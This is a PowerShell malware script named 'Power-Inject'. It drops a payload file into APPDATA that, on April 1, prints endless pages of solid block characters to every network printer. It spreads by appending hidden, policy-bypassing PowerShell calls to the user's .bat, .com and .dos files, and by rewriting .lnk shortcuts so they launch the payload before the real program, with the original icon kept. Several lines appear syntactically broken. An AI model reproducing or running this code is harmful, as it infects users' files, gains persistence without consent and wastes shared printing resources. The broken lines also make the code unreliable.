$ErrorActionPreference = "SilentlyContinue"
$command = ""
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
function Power-Inject{
    $bat = GCI -Path $env:UserProfile -Filter *.bat -Recurse
    $com = GCI -Path $env:UserProfile -Filter *.com -Recurse
    $dos = GCI -Path $env:UserProfile -Filter *.dos -Recurse
    $lnk = GCI -Path $env:UserProfile -Filter *.lnk -Recurse
    New-Item -Path $env:APPDATA -Type File -Value PI.ps1
    Add-Content -Path $env:APPDATA -Value{if(Get-Date -Format MM:dd = "04:01"){
#create ink waster with unicode "fullblock" character "█"
$lines = "█"*2754
#find IPs of all local network printers
$names = Get-WmiObject Win32_Printer
#$names = @((New-Object -ComObject WScript.Network).EnumPrinterConnections() | findstr /r /e /i "[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*\.[0-9][0-9]*") #Old style IP finder
#create infinite execution loop
while($true){
    $i++
    #foreach loop that prints the ink waster value $lines to every network printer
    foreach ($name in $names.name){
        #print
        $lines | out-printer -Name $name
        Write-Host "Printing Sheet: $i"
        Write-Host "On Every Printer"
        Clear-Host
    }
}}}
    foreach($file in $bat){
        Get-ChildItem -Path $env:HOMEDRIVE -Filter "PI.ps1" -Recurse -OutVariable a | Out-Null
        $start = $a[0].FullName
        powershell -EP ByPass -WindowStyle Hidden -NoLogo -File $start
        $contains = Get-Content -Path $start -Filter "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
        if($contains -eq $null){
            Add-Content -Path $file.FullName -Value "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
        }
    }
    foreach($file in $com){
        Get-ChildItem -Path $env:HOMEDRIVE -Filter "PI.ps1" -Recurse -OutVariable a | Out-Null
        $start = $a[0].FullName
        powershell -EP ByPass -WindowStyle Hidden -NoLogo -File $start
        $contains = Get-Content -Path $start -Filter "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
        if($contains -eq $null){
            Add-Content -Path $file.FullName -Value "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
        }
    }
    foreach($file in $dos){
        Get-ChildItem -Path $env:HOMEDRIVE -Filter "PI.ps1" -Recurse -OutVariable a | Out-Null
        $start = $a[0].FullName
        powershell -EP ByPass -WindowStyle Hidden -NoLogo -File $start
        $contains = Get-Content -Path $start -Filter "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
        if($contains -eq $null){
            Add-Content -Path $file.FullName -Value "powershell.exe -EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File "$Start""
        }
    }
    foreach($file in $lnk){
        $temp = $file.Name
        Copy-Item -Path $file.FullName -Destination $env:APPDATA -Force
        $WshShell = New-Object -comObject WScript.Shell
        $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\$temp")
        $SourceExe = $Shortcut.TargetPath
        $Shortcut.TargetPath = "powershell.exe"
        New-Item -Path "$env:APPDATA\$temp.ps1" -Type file -Force | Out-Null
        Add-Content -Path "$env:APPDATA\$temp.ps1" -Value {powershell -EP ByPass -WindowStyle Hidden -NoLogo -File "$env:APPDATA\PI.ps1"}
        Add-Content -Path "$env:APPDATA\$temp.ps1" -Value "start `"$SourceExe`""
        $Script = "$env:APPDATA\$temp.ps1"
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
        $encodedCommand = [Convert]::ToBase64String($bytes)
        $Shortcut.Arguments = "-EP ByPass -WindowStyle Hidden -NoProfile -NoLogo -File `"$Script`""
        $Shortcut.IconLocation = $SourceExe
        $Shortcut.Save()
    }
}
